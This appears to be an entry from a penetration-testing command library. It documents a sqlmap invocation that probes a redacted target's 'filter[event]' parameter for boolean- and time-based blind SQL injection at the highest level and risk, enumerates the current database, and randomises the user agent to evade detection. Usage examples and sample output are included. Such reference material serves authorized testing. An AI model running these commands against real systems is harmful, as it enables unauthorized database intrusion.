---
data: >-
  sqlmap -u "███████" --technique=BT --level=5 --risk=3 --threads=10 -p
  'filter[event]' --dbms='MySQL' --batch --current-db --random-agent
tags:
  - sqli
  - detection
  - blind
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 5f06ce93-fd91-4605-925d-0b7c0a6b066e
created_at: '2025-12-14T03:15:05.090Z'
updated_at: '2025-12-14T03:15:05.090Z'
verified: false
validated: true
submitted: true
---
# sqlmap-test-blind-sqli

## Command

```bash
sqlmap -u "███████" --technique=BT --level=5 --risk=3 --threads=10 -p 'filter[event]' --dbms='MySQL' --batch --current-db --random-agent
```

## Description

This command tests a web application's parameter for Blind SQL Injection using SQLMap, focusing on boolean-based and time-based techniques to confirm vulnerability and enumerate the current database name without direct output.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Specifies the target URL (redacted here) | Yes |
| `--technique=BT` | Uses Boolean-based (B) and Time-based (T) blind techniques | Yes |
| `--level=5` | Highest level for extensive payload testing | No |
| `--risk=3` | Highest risk for aggressive payloads | No |
| `--threads=10` | Number of concurrent threads for speed | No |
| `-p 'filter[event]'` | Targets the specific injectable parameter | Yes |
| `--dbms='MySQL'` | Specifies the database type | Yes |
| `--batch` | Non-interactive mode | No |
| `--current-db` | Enumerates the current database | Yes |
| `--random-agent` | Randomizes User-Agent to evade detection | No |

## Examples

### Basic Usage

```bash
sqlmap -u "http://example.com/page?filter[event]=test" --technique=B -p 'filter[event]' --dbms=MySQL --current-db
```

### Advanced Usage

```bash
sqlmap -u "███████" --technique=BT --level=5 --risk=3 --threads=10 -p 'filter[event]' --dbms='MySQL' --batch --current-db --random-agent --proxy=http://127.0.0.1:8080
```

## Expected Output

SQLMap will output vulnerability confirmation, such as "Parameter: filter[event] (GET) is vulnerable" followed by the current database name (e.g., "Current database: 'dod_app_db'"). If unsuccessful, it reports no injection found with potential HTTP errors.

## Related

- [[Related Procedure: Detect-Blind-SQL-Injection-with-SQLMap]]
